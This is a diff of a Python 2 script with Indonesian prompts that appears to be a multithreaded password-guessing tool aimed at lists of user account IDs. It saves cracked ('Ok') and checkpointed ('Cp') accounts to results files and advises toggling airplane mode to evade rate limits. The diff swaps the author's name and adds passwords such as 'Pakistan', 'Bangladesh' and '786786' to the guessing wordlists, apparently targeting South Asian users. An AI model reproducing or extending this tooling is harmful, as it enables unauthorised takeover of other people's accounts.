@@ -634,8 +634,8 @@ def ___metode___():
             ids=open(___file___).read().splitlines()
         except:
             exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
-        print("\n%s[%sâ€¢%s]%s RIAZ Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
-        print("%s[%sâ€¢%s]%s RIAZ Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
+        print("\n%s[%sâ€¢%s]%s MATEEN Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
+        print("%s[%sâ€¢%s]%s MATEEN Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
         print("%s[%s!%s]%s Gunakan Mode Pesawat Di Angka 1000,2000...\n"%(B,M,B,P))
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
@@ -655,8 +655,8 @@ def ___metode___():
         os.remove(___file___)
         exit("\n%s[%sSelesai%s]"%(B,H,P))
     elif ___metode___ in ['2','02']:
-        print("\n%s[%s1%s]%s Gunakan Password [nama,nama123,nama12345]"%(H,P,H,P))
-        print("%s[%s2%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,nama123456]"%(H,P,H,P))
+        print("\n%s[%s1%s]%s Gunakan Password [nama,nama123,nama12345,Bangladesh,001122]"%(H,P,H,P))
+        print("%s[%s2%s]%s Gunakan Password [nama,nama123,nama1234,786786,nama12345,nama123456,Pakistan]"%(H,P,H,P))
         print("%s[%s3%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,Sayang,Dll]"%(H,P,H,P))
         print("%s[%s4%s]%s Gunakan Password Manual [ >6 ]"%(H,P,H,P))
         ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
